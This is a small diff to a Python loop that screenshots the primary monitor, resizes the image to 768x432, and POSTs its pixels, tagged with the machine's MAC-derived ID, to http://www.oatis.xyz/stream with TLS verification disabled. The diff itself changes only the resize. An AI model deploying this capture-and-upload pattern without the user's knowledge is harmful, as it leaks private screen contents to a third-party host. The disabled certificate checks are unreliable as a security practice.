@@ -26,7 +26,7 @@ def mainloop(fps):
       with mss() as visual:
         image = visual.grab(visual.monitors[1])
         image = Image.frombytes("RGB", image.size, image.rgb)
-        image = image.resize((image.width//4, image.height//4))
+        image = image.resize((768, 432))
         name = hex(getnode())
         post(url="http://www.oatis.xyz/stream", json={"pixels": str(list(image.getdata())), "name": str(name)}, verify=False)
         print("Image sent from:", str(name))
